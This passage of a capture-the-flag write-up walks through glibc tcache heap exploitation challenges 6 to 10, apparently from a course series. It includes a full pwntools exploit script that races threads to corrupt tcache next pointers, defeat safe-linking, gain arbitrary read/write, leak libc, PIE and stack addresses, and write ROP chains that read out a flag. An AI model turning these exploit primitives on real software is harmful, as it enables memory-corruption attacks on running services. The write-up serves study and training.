    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak stack address via libc
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=4)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')

    # Read the secret
    secret_addr = environ_stack_addr + 0x110
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

## Challenge 6

This time the leak resides within the main heap. \
Simply retrieve this value out of the leaked `main_arena`, which is stored within libc. 

```python
def exploit():
    ...
    # Leak main heap
    main_heap_leak_addr = main_arena_libc_addr + 0x60
    heap_base = arbitrary_read(r1, r2, heap_key, addr=main_heap_leak_addr, index=2)
    assert(len(heap_base) == 6)
    heap_base = u64(heap_base + 2 * b'\x00') & 0xfffffffffffff000
    print(f'heap_base: {hex(heap_base)}')

    # Read the secret
    secret_addr = heap_base + 0x3e0
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')
```

## Challenge 7

Now there's no more flag resides within memory. Moreover, binary has full mitigations - PIE, NX Canary and full RELRO. Hence, we have the need for a generic write primitive, and overwrite the stack's RA and forge a ROP chain. \
Notice there are multiple stacks we can overwrite - the main thread, or any other thread. For simplicity of the exploit I've chose to stick with our lovely first thread as the only-exploited thread. \
I've chose to leak the thread's stack using the main heap, as it is more reliable than using the program's stack. In particular, I've chose to overwrite the return address of the internal frame opened by `fscanf`. \
That way this would work even if the program was compiled with `__noreturn` on its implemented methods. Moreover, a cool trick is that because some internal functions within libc are compiled without canaries, eventhough the binary did, there are no canaries - and we can perform linear stack overflow for a tcache chunk allocated there (at the generic case, in case `ra` isn't aligned to `0x10`). 

```python
p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak main heap
    main_heap_leak_addr = main_arena_libc_addr + 0x60
    heap_base = arbitrary_read(r1, r2, heap_key, addr=main_heap_leak_addr, index=2)
    assert(len(heap_base) == 6)
    heap_base = u64(heap_base + 2 * b'\x00') & 0xfffffffffffff000
    print(f'heap_base: {hex(heap_base)}')

    # Read thread stack using a pointer resides within the main thread's heap
    t1_stack_leak_offset = 0x2e0
    t1_stack_leak_addr = heap_base + t1_stack_leak_offset
    print(f't1_stack_leak_addr: {hex(t1_stack_leak_addr)}')
    t1_stack_leak = arbitrary_read(r1, r2, heap_key, addr=t1_stack_leak_addr, index=4)
    assert(len(t1_stack_leak) == 6)
    t1_stack_leak = u64(t1_stack_leak + 2 * b'\x00')
    t1_ra_offset = 0xc98
    t1_ra_addr = t1_stack_leak - t1_ra_offset
    print(f't1_stack_leak: {hex(t1_stack_leak)} t1_ra_addr: {hex(t1_ra_addr)}')

    # Overwrite ra
    flag_string_addr = t1_ra_addr + 0x28
    rop_bytes = b'A' * 0x28
    rop_bytes += p64(pop_rdi_ret)
    rop_bytes += p64(flag_string_addr)
    rop_bytes += p64(pop_rsi_ret)
    rop_bytes += p64(0xffff)
    rop_bytes += p64(chmod_addr)
    rop_bytes += p64(0x67616c662f)  # flag
    arbitrary_write(r1, r2, heap_key, addr=t1_ra_addr - 0x28, values=rop_bytes, index=6)
```

## Challenge 8

Because I've used the libc-no-canary trick, I could arbitrarly overwrite return addresses of internal libc calls, even if they weren't aligned to 0x10. \
That way, the no-return compilation flag had no impact for my exploit, and the solution is identical to 7.

## Challenge 9

This challenge is pretty cool. It starts by performing 8 allocations, all of size `0x400`. Then, it performs `malloc(9)` and stores the secret there. \
For every `malloc` request, a random allocation is being performed, of random size. There seems to be a loop of only 1 allocation, hence I'd assume challenge 10 requires dealing with multiple / random amount of allocations. 

It is interesting to see how the size randomization is actually achieved. `rand_size` is actually a variable located within the .bss. In particular, the seed that is being used is its own address:

```c
rand_size = rand_r(&rand_size) % 0x4000;
```

This means that the allocations are completely deterministic. \
Another thing to consider, is the fact that all allocations are saved within `surprise` array, located within the .bss too. Moreover, for every `free` request, both the slot and the randomized chunks are being freed. \
Keep in mind the ordering: for `malloc`, the surprise allocations are being performed before our allocation. For `free`, our reclamation occurs before the surprise reclamations. \
A good candidate for first leak, is a freed tcache chunk's `next` ptr. From now on, let us denote `s1(0)` as "surprise allocation trigerred by thread-1 tcache to surprise[0]", and `m2(5)` as "message allocation by thread-2 tcache to messages[5]". \
Recall that the odds for a surprise `malloc` to fall exactly within `tcachebin[0x410]` are fairly low. Therefore, we can still achieve a mangled heap pointer as follows:

```bash
malloc(0)
--> malloc(s1(0))
--> malloc(m1(0))
malloc(1)
--> malloc(s1(1 * 3))
--> malloc(m1(1))
free(1)
--> free(m1(1))
--> free(s1(1 * 3))
free(0)
--> free(m1(0))
--> free(s1(0))
```

This means that as long as `s1(0), s1(3)` were not allocated within our target bin, we should be able to leak a pointer by further allocating a chunk. \
In case there is a tcachebin-collision, the tcache would be of size 3 or 4 instead of 2. This means we can easily detect this scenario, and develop a generic exploit that would deal with it.

For easier research, I've wrote the following tricky gdbscript within python script:

```bash
GDB_SCRIPT= '''
set follow-fork-mode parent
break challenge
commands
    silent
    if $_thread == 2
        b chmod
        commands
            print "@@@in chmod@@@"
        end

        b malloc thread 2
        commands
            silent
            printf "malloc(%p)\\n", $rdi
            c
        end

        b free thread 2 if $rdi != 0
        commands
            silent
            printf "free(%p)\\n", $rdi
            c
        end

        b *challenge+0x93 thread 2
        commands
            silent
            printf "result:%p\\n", $rax
            c
        end

        b *challenge+0xc3 thread 2
        commands
            silent
            printf "result:%p\\n", $rax
            c
        end
        
        b *challenge+0x2d0 thread 2
        commands
            silent
            printf "result:%p\\n", $rax
            c
        end

        b *challenge+0x385 thread 2
        commands
            silent
            printf "result:%p\\n", $rax
            c
        end

    end
    c
end
c
'''
```

While seem intimidating at first, it just tracks thread-2 (our exploiting thread) allocations and de-allocations (for some reason `fin` seems to be abit buggy with nested conditional breakpoints for multithreaded programs..):

```bash
# Challenge bootstrap
malloc(0x400)
result:0x7fbf2c000f30
malloc(0x400)
result:0x7fbf2c001340
malloc(0x400)
result:0x7fbf2c001750
malloc(0x400)
result:0x7fbf2c001b60
malloc(0x400)
result:0x7fbf2c001f70
malloc(0x400)
result:0x7fbf2c002380
malloc(0x400)
result:0x7fbf2c002790
malloc(0x400)
result:0x7fbf2c002ba0
free(0x7fbf2c002ba0)
malloc(0x9)
result:0x7fbf2c002fb0
# Exploit starts here
malloc(0x2f2)
result:0x7fbf2c002fd0
malloc(0x400)
result:0x7fbf2c002ba0
malloc(0x2228)
result:0x7fbf2c0032d0
malloc(0x400)
result:0x7fbf2c005500
free(0x7fbf2c005500)
free(0x7fbf2c0032d0)
free(0x7fbf2c002ba0)
free(0x7fbf2c002fd0)
malloc(0x54f)
result:0x7fbf2c0032d0
malloc(0x400)
result:0x7fbf2c002ba0
free(0x7fbf2c002ba0)
free(0x7fbf2c0032d0)
```

Using this detailed debugging, I've understood the importance of the 8 allocations that are being made prior to the challenge's run:

```c
for ( i = 0; i <= 7; ++i )
    ptr = malloc(0x400uLL);
free(ptr);
ptr = malloc(9uLL);
```

This means that our first `0x400` allocation would probably (in case the surprise allocation won't be within the same bin) fall within deterministic offset within the heap - address `0x7fbf2c002ba0` in the above example. \
Moreover, because there's no real randomization here, it is actually guranteed that the `next` ptr within `tcachebin[0x400]` would have LSBs of `0x5500`. 

In order to obtain the read primitive, recall we have to implement the `write_nextptr` primitive. In previous challenges, I made sure T1 would always `malloc, free` and T2 would `scanf` into the allocated chunk, having `tcachebin[0x400]` populated with 2 chunks:

```bash
malloc(m1(0))   # T1
slots[0] == 1?  # T2
free(m1(0))     # T1
scanf(m1(0))    # T2
slots[0] = 0    # T1
```

However, because of the extra allocations and deallocations, now the following ordering occurs:

```bash
malloc(s1(0))   # T1
malloc(m1(0))   # T1
slots[0] == 1?  # T2
free(m1(0))     # T1
free(s1(0))     # T1
scanf(m1(0))    # T2
slots[0] = 0    # T1
```

However, in case the surprise allocations are not within the same tcachebin, we shouldn't be interrupted by them. \
Therefore, the solution is pretty similar to before:

```python
def exploit():
    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x5500
    mangled_heap_next = read_nextptr(r1)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    assert(r1_heap_base & 0xfff == 0)

    # Read the secret
    secret_addr = r1_heap_base + 0x2fb0
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

Hence, the main takeaway from this challenge, is that tcache exploitation is fairly easier within multithreaded environments. This is due to every thread having its own tcache, and every allocation size have its own bins. So by proper design, allocations won't collide with a very good probability. 

## Challenge 10

Now there are 3 surprise allocations for every `malloc` request. In addition, now the random seed is initialized a little bit better, via `time`. Because the granularity of the return value of `time` is within seconds, we can still predict percisely the exact sizes of the allocations. However, we would have our exploit to take that into account, and compute the expected offsets dynamically. Moreover, there's no `send_flag` handler and the binary is full RELRO, so we'd have to craft a ROP chain. \
If thats not enough, `setgid` and `setuid` are called, dropping privileges to `uid=1000` (regular user). This means that we won't be able to open the flag directly, nor chmoding it, or popping a privileged shell using `setuid, call system` ROP chain. By reading `setuid` manpage, I've learned few key points:

1. `setuid` is being performed on the whole process, not just a specific thread (at least its `libc` wrapper) . 

2. For a suid binary (or a regular program where its user is `root`), `setuid` checks the `euid` of the program and if its `0`. If so, it sets ALL ids (`uid`, `saved uid`, `euid`) to the unprivileged value (`1000` in our case).

3. Because of point (2), upon running `setuid(1000)`, there is no way to regain root privileges. In case we'd like to temporarly drop privileges, we would use `seteuid(1000)` instead, which is reversible operation. 

However, notice that the program actually loads the flag file stream, and keeps it open. This means that in case we'd forge arbitrary R / W, we can overwrite `stdin, stdout` file streams (swapping its `fd` to the open flag stream, and changing the intermediate flush buffer) so that `fscanf, fprintf` would actually leak the flag content. Hence, my initial idea was to load the flag into memory by `stdin` stream corruption (just changing its `fd`), and leak the flag off the memory by `stdout`. \
However, I can do better. Upon obtaining a branch primitive using ROP, I can simply issue `fread` calls on the open stream to some .bss buffer, then `fwrite` to propagate the buffer into `stdout`. Even better - we can call the `sendfile` syscall, on the internal `fd` that was opened by the flag stream, towards `STDOUT_FILENO`. Easy.

Upon debugging the binary under `gdb`, I've noticed that the main thread receives an obscure `SIG33` for every new connection (only for this challenge, probably this has something to do with the `euid` being changed?). I've read about this, and it seems to be caused by old implementation design choice of threading libararies (`pthread` in our case). Anyways, I've ignored it via:

```bash
handle SIG33 nostop noprint
```

Regarding exploitation, recall we can still easily get a leak of a valid `next` pointer. Although it isn't at a known offset, we do know the heap have to be aligned. Therefore we may retrieve the thread's base heap address regardless of allocation randomization. \
Moreover, since `main_arena` ptr is placed within the thread's local heap before any allocations are made, its offset isn't affected by the random allocations either. However, recall my generic `demangle` method works only in case the difference between the chunk that is being read address and its `next` ptr value, is under `0x10` pages. Otherwise, the returned value of `key` is corrupted. Because there are 3 random allocations before our chunk, it isn't guranteed that the chunks difference would be less than `0x10` pages, hence this `demangle` method won't always work. Since there is 1 surprise allocation, distributed uniformly from `0~0x4000`, its average allocation size is `0x2000`. In a similar manner, two other chunks are allocated from uniform distribution of up to `0x10000`. Hence, on average, `0x2000 + 2 * 0x8000 = 0x12000` bytes would be allocated. However, this means that I do have `10 / (10 + 12) = 45%` chance of demangling the key correctly. \
Next, after I've retrieved the mangled `next` pointer, demangled it successfully, and overwrote the `next` ptr of the first chunk within the tcachebin succesfully, I've noticed the preceding 2 allocations aren't being made properly. I've added an extra `printf` request, and used the following gdbscript to be applied right after the write is being made:

```bash
GDB_SCRIPT= '''
set follow-fork-mode parent
handle SIG33 nostop noprint

break *challenge+0x1c7
commands
    silent
    print "in printf handler"
    if $_thread == 2
        b malloc thread 2
        commands
            silent
            printf "malloc(%p)\\n", $rdi
            c
        end

        b free thread 2 if $rdi != 0
        commands
            silent
            printf "free(%p)\\n", $rdi
            c
        end

    end
    c
end
ignore 1 1

c
'''
```

This was due to the surprise allocations falling sometimes within `tcachebin[0x410]`, hence being allocated to our goal chunk. \
Weirdly, while implementing the write primitive, although the `next` ptr has been overwritten succesfully, the `scanf` call sometimes wrote the ROP chain into the thread's heap, instead of to the return address within the stack. 
I've verified, and my payload was correct. After adding few characters to the payload, this was less likely to happen (but still did), and the input was written right to the stack instead of the heap. I assume this is exactly libc I/O buffering that is being made, writing my bytes into the intermediate buffer within the heap. \
The following solution obtains full R / W primtives with decent statistics, and obtains control flow primitive to execute ROP chain of our wish:

```python
#!/bin/python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
BINARY = glob('/challenge/baby*')[0]
LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
handle SIG33 nostop noprint

break *challenge+0x1c7
commands
    silent
    print "in printf handler"
    if $_thread == 2
        # b malloc thread 2
        # commands
        #     silent
        #     printf "malloc(%p)\\n", $rdi
        # end

        # b *challenge+0x34e thread 2
        # commands
        #     silent
        #     printf "result: %p\\n", $rax
        # end

        # b *challenge+0x403 thread 2
        # commands
        #     silent
        #     printf "result: %p\\n", $rax
        # end

        b *challenge+0x4f0 thread 2
        commands 
            silent
            printf "About to WRITE into our goal RA: %p\\n", $rdx
        end

    end
    c
end
ignore 1 4

c
'''

context.arch = 'amd64'
libc = ELF(LIBC)
libc_rop = ROP(LIBC, badchars=string.whitespace)


def malloc(p, index):
    buf = b'malloc '
    buf += str(index).encode()
    p.sendline(buf)
    
def free(p, index):
    buf = b'free '
    buf += str(index).encode()
    p.sendline(buf)

def scanf(p, index, data, batch=1):
    for char in '\x09\x0a\x0b\x0c\x0d\x0e\x0f\x20':
        if char.encode() in data:
            raise Exception(f'data: {data} contains bad character: "{hex(ord(char))}"')

    buf = b'scanf '
    buf += str(index).encode() + b' '
    buf += data + b' '
    buf *= batch
    p.sendline(buf)

def printf(p, index, batch=1):
    buf = b'printf '
    buf += str(index).encode() + b' '
    buf *= batch
    p.sendline(buf)
    p.recvuntil(b'MESSAGE: ')
    message = p.readline()[:-1]
    return message

def send_flag(p, secret):
    p.sendline(b'send_flag')
    p.recvuntil(b'Secret: ')
    p.sendline(secret)
    for _ in range(3):
        print(p.readline())

def allocate_at_addr(r1, r2, key, index, addr, debug=False):
    '''
    Allocates chunk at specified addr, taking safe-linking into account. 
    The result is saved in [index + 1].
    SIDE EFFECT: Corrupts slots [index], and nullifies [addr + 8]. 
    '''
    assert((addr & 0xf) == 0)
    write_nextptr(r1, r2, key, addr, index)
    
    if debug:
        printf(r1, 0)

    # Allocate chunk right on the addr, store at [index + 1], and never free it (as not all addresses are free-able)
    malloc(r1, index + 2)    
    malloc(r1, index + 1) 

    return

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle_ptr(mangled):
    '''
    Assumes the next chunk and the wrapping chunk are up to 0x10 pages away from each other. 
    Otherwise, the demangling would fail. 
    '''
    o = mangle(mangled, mangled)
    ptr = (o >> 24) ^ o
    key = ptr ^ mangled
    # Perform semi-brute force, to generalize demangling of up to 0x10 pages difference between pos and ptr. 
    for i in range(0x10):
        candid_key = key - i
        candid_ptr = mangled ^ candid_key
        if ((candid_ptr & 0xf) == 0):
            return candid_ptr, candid_key

    raise('demangling failed!')

def read_nextptr(r1):
    # Because we've warmed up, the tcache has filled, and no need for 2 allocations
    malloc(r1, 0)
    data = printf(r1, 0)
    free(r1, 0)
    assert(len(data) == 6)
    mangled_heap_ptr = data + b'\x00' * 2
    mangled_heap_ptr = u64(mangled_heap_ptr)

    return mangled_heap_ptr

def write_nextptr(r1, r2, key, addr, index):
    iterations = 1000
    if os.fork() == 0:
        # Child
        for _ in range(iterations):
            malloc_free_command = buf = b'malloc ' + str(index).encode() + b' free ' + str(index).encode() + b' '
            malloc_free_command *= 100
            r1.sendline(malloc_free_command)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        # Parent
        new_next = p64(addr ^ key)
        for _ in range(iterations):
            scanf(r2, index, new_next, 500)  # Can optimize this, do not re-gen string every iteration
    os.wait()

    return


def arbitrary_read(r1, r2, key, addr, index, paddings_size=0, debug=False):
    '''
    Internally, corrupts slot [index]
    Has a side effect of nullifying some bytes near the leak, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    read_addr = addr - paddings_size
    # Allocate the chunk within a fresh slot, index + 1. It would never be freed from there.
    allocate_at_addr(r1, r2, key, index, read_addr, debug)

    # Trick - for non aligned reads, allocate a chunk at [addr - paddings_size], and fill it with paddings_size crap bytes. 
    if paddings_size:
        pad_bytes = b'A' * paddings_size
        scanf(r1, index + 1, pad_bytes)
    buf = printf(r1, index + 1)
    # Restore state, now [index + 2] -> [index + 3] within the tcache
    # At this point, the tcache is empty. Add another allocation and free it. 
    # That way the tcache would have 2 available chunks, and the tcache invariant holds. 
    malloc(r1, index + 3)
    free(r1, index + 3)
    free(r1, index + 2)
    
    return buf


def arbitrary_write(r1, r2, key, addr, values, index, debug=False):
    '''
    Internally, corrupts slots [index, index + 1]
    Has a side effect of nullifying some bytes near the allocation, as a malloc chunk is being allocated and chunk->key = NULL. 
    Notice: addr isn't bound for alignment. In that case, it is being rounded down, and junk bytes are being filled
    '''
    padding_size = addr & 0xf
    values = b'A' * padding_size + values  # Since the allocation may be 8 bytes before the goal address, we have to supply extra padding
    write_addr = addr - padding_size
    # Allocate at [index + 1]
    allocate_at_addr(r1, r2, key, index, write_addr, debug)  

    # Write
    scanf(r1, index + 1, values)

    # Restore state
    malloc(r1, index + 3)
    free(r1, index + 3)
    free(r1, index + 2)
    
    return

def warm_tcache(p, index=0):
    log.info('Warming tcache..')
    for _ in range(1):
        malloc(p, index)
        malloc(p, index + 1)
        free(p, index + 1)
        free(p, index)
    log.info('Warm tcache complete')

def main():    
    debug = True
    if debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        p = process(BINARY)

    time.sleep(3)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, 0)

    # Leak a mangled heap pointer
    mangled_heap_next = read_nextptr(r1)
    log.info(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next & 0xfffffffffff00000
    log.info(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    log.info(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_heap_offset = 0x8a0
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    log.info(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')

    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    log.info(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    fread_libc = libc_base + libc.symbols['fread']
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    pop_rdx_ret = libc_base + libc_rop.rdx.address
    pop_rcx_pop_rbx_ret = libc_base + libc_rop.rcx.address
    log.info(f'libc_base: {hex(libc_base)} fread_libc: {hex(fread_libc)} chmod_addr: {hex(chmod_addr)}')
    assert(libc_base & 0xfff == 0)
    
    # Leak main heap
    main_heap_leak_addr = main_arena_libc_addr + 0x60
    heap_base = arbitrary_read(r1, r2, heap_key, addr=main_heap_leak_addr, index=2)
    assert(len(heap_base) == 6)
    heap_base = u64(heap_base + 2 * b'\x00') & 0xfffffffffffff000
    log.info(f'heap_base: {hex(heap_base)}')

    # Leak PIE base address via libc->ld
    libc_to_ld_offset = 0x22a000
    ld_base = libc_base + libc_to_ld_offset
    print(f'ld_base: {hex(ld_base)}')
    dl_pie_leak_addr = ld_base + 0x3b2f0
    pie_leak_offset = 0x4cb0
    print(f'dl_pie_leak_addr: {hex(dl_pie_leak_addr)}')
    pie_base = arbitrary_read(r1, r2, heap_key, addr=dl_pie_leak_addr, index=4)
    assert(len(pie_base) == 6)
    pie_base = u64(pie_base + 2 * b'\x00') - pie_leak_offset
    print(f'pie_base: {hex(pie_base)}')
    assert((pie_base & 0xfff) == 0)

    # Leak stack address via libc
    # key: (heap_next - allocation_size) >> 12
    # Notice: because of the smart tcache invariant, we dont have to track allocations.
    # The reason is that all allocations are being made from the same, the first, chunk :)
    # log.info("Reading stack address")
    # environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=2)  
    # assert(len(environ_stack_addr) == 6)
    # environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    # log.info(f'environ_stack_addr: {hex(environ_stack_addr)}')
    
    # Read thread stack using a pointer resides within the main thread's heap
    t1_stack_leak_offset = 0x2e0
    t1_stack_leak_addr = heap_base + t1_stack_leak_offset
    log.info(f't1_stack_leak_addr: {hex(t1_stack_leak_addr)}')
    t1_stack_leak = arbitrary_read(r1, r2, heap_key, addr=t1_stack_leak_addr, index=6)
    assert(len(t1_stack_leak) == 6)
    t1_stack_leak = u64(t1_stack_leak + 2 * b'\x00')
    t1_ra_offset = 0xc78
    t1_ra_addr = t1_stack_leak - t1_ra_offset
    log.info(f't1_stack_leak: {hex(t1_stack_leak)} t1_ra_addr: {hex(t1_ra_addr)}')

    # Overwrite ra
    rop_bytes = b'A' * 0x28
    rop_bytes += p64(pop_rdi_ret)
    rop_bytes += p64(r1_heap_base + 0x5000)  # Buf that would store flag
    rop_bytes += p64(pop_rsi_ret)
    rop_bytes += p64(1)  
    rop_bytes += p64(pop_rdx_ret)
    rop_bytes += p64(0x80)
    rop_bytes += p64(pop_rcx_pop_rbx_ret)
    rop_bytes += p64(pie_base + p.elf.symbols[b'stream'])
    rop_bytes += p64(0x4242424242424242)
    rop_bytes += p64(fread_libc)
    arbitrary_write(r1, r2, heap_key, addr=t1_ra_addr - 0x28, values=rop_bytes, index=8, debug=True)

    p.interactive()


if __name__ == '__main__':
    main()
```

The ROP chain simply calls `fread` on the opened file stream. I've also tried `read, write`, `sendfile` syscalls on the internal `fd` of the file stream, however - none of them worked, returning a retval of `0`, without performing any operation. \
For long time, I couldn't figure our why. Notice, however, that because the `flag`'s file stream was actually read abit, this means that the intermediate buffer within the heap have fetched all of its content. In particular, this have 2 major implications:

1. The flag is actually fully loaded somewhere on the heap, early at the challenge bootstrapping, before any surprise allocations have been made.

2. The `offset` (file's position) within the kernel's corresponding `struct File` was updated, such that it now **points towards the end of the flag**. This means that any preceding reads from that file descriptors would return `0`, as there are no more bytes to be read. And that's why my ROPs didn't emit the flag!

Because allocating a tcache chunk actually nullifies `p->key`, the best idea to leak the whole memory (flag) content, is by calling `puts` on its address. The following ROP chain does exactly this. 

```python
flag_addr = r1_heap_base + 0x1110
log.info(f'flag addr: {hex(flag_addr)}')
# Overwrite ra
rop_bytes = b'A' * 0x28
rop_bytes += p64(pop_rdi_ret)
rop_bytes += p64(flag_addr)
rop_bytes += p64(puts_libc)
arbitrary_write(r1, r2, heap_key, addr=t1_ra_addr - 0x28, values=rop_bytes, index=8)

p.interactive()
```

## Note about `uid`, `euid`

TODO: add the small `.c` program that launches a program similar to the challenge, drops privileges, and prints the various `uid, euid, saved-uid`. For both regular run, and `suid`. a shell. 

`setuid(1000)` for a suid binary is irreversible. `seteuid` is. 




[memory-leaks]: https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/
